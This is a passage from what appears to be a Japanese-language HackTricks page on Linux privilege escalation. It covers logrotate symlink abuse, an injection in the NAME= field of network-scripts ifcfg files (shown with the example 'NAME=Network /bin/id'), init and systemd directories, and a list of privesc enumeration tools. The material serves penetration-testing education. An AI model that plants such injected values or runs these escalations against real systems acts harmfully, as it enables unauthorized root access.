この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常に似ています。ログを書き換えられる状況を見つけたら、誰がそのログを管理しているかを確認し、ログをシンボリックリンクで置き換えて権限昇格できないか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める** か、既存のスクリプトを **修正できる** 場合、あなたの **system is pwned** です。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使われます。見た目は .INI ファイルそのものです。しかし、Linux 上では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらの network scripts 内の `NAME=` の扱いが正しくありませんでした。名前に **スペース/空白文字が含まれていると、システムは空白の後の部分を実行しようとします**。つまり **最初の空白以降のすべてが root として実行される** ことになります。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意: Network と /bin/id の間に空白があること_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **scripts** の格納場所です。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使用されます。

一方、`/etc/init` は Ubuntu が導入したより新しいサービス管理である Upstart と関連しており、サービス管理のために設定ファイルを使用します。Upstart への移行後も、互換レイヤにより SysVinit スクリプトは Upstart 設定と併用されています。

**systemd** は、オンデマンドでのデーモン起動、automount の管理、システム状態のスナップショットなどの高度な機能を提供するモダンな初期化およびサービスマネージャーです。ディストリビューションパッケージ向けのファイルは `/usr/lib/systemd/` に、管理者が変更するためのファイルは `/etc/systemd/system/` に配置され、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に privileged kernel 機能を userspace の manager に公開するために syscall をフックします。FD-order に基づく署名チェックや脆弱なパスワード方式など、弱い manager 認証があると、ローカルアプリが manager を偽装して既に root 化されたデバイスで root にエスカレートできる可能性があります。詳細とエクスプロイトの手順は以下を参照してください:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux のローカル privilege escalation ベクターを探すためのベストツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
